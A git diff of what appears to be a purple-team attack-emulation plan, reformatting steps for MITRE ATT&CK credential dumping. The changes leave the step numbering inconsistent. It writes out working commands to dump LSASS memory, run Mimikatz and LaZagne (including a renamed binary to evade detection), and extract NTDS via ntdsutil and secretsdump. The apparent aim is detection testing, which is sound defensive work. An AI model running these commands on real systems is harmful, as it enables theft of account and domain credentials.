@@ -173,26 +173,29 @@ Calling export function by negative ordinal number with args
 ### Step 22 - Credential Access: T1003.001 OS Credential Dumping: LSASS Memory & S0002 Mimikatz & S0349 Lazagne
 
 1. Dump LSASS Memory using comsvcs.dll by running the following command in an elevated command prompt:
-1.1 ```rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Users\purple\lsass-comsvcs.dmp full```
+  1.1 ```rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Users\purple\lsass-comsvcs.dmp full```
 2. Download Mimikatz here: https://github.com/gentilkiwi/mimikatz/releases/latest and run the following in an elevated command prompt:
-2.1 ```mimikatz.exe```
-2.2 ```privilege::debug```
-2.3 ```sekurlsa::logonpasswords```
-3. Download ""Invoke-Mimikatz"" as m.ps1 and run the following in an elevated Powershell prompt:
-3.1 ```Import-Module C:\Users\purple\m.ps1; Invoke-Mimikatz -ComputerName <COMPUTER_NAME>```
-4. Download LaZagne here: https://github.com/AlessandroZ/LaZagne/releases/latest and run the following in an elevated command prompt:
-4.1 ```lazagne.exe all -oN -output C:\Users\purple```
-5. Execute the same procedure as 4 but with a renamed binary 
-5.1 ```ls.exe all -oN -output C:\Users\purple```
+   2.1 ```mimikatz.exe```
+   
+   2.2 ```privilege::debug```
+   
+   2.3 ```sekurlsa::logonpasswords```
+4. Download ""Invoke-Mimikatz"" as m.ps1 and run the following in an elevated Powershell prompt:
+  3.1 ```Import-Module C:\Users\purple\m.ps1; Invoke-Mimikatz -ComputerName <COMPUTER_NAME>```
+5. Download LaZagne here: https://github.com/AlessandroZ/LaZagne/releases/latest and run the following in an elevated command prompt:
+  4.1 ```lazagne.exe all -oN -output C:\Users\purple```
+6. Execute the same procedure as 4 but with a renamed binary 
+  5.1 ```ls.exe all -oN -output C:\Users\purple```
 
 ### Step 23 - Credential Access: T1003.003 OS Credential Dumping: NTDS
 
 1. Dump NTDS with ntdsutil by running the following in a command prompt on DC:
-1.1 ```ntdsutil ""ac i ntds"" ""ifm"" ""create full dump_folder"" q q```
+   1.1 ```ntdsutil ""ac i ntds"" ""ifm"" ""create full dump_folder"" q q```
 
 2. Dump NTDS using secretsdump.py downloaded at: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
-2.1 ```python3 secretsdump.py -just-dc domain/user@DChostname```
-2.2 ```python3 secretsdump.py -just-dc domain/user@DC hostname -use-vss```
+   2.1 ```python3 secretsdump.py -just-dc domain/user@DChostname```
+   
+   2.2 ```python3 secretsdump.py -just-dc domain/user@DC hostname -use-vss```
 
 ### Step 24 - Credential Access: T1110.003 Brute force: Password Spraying
 
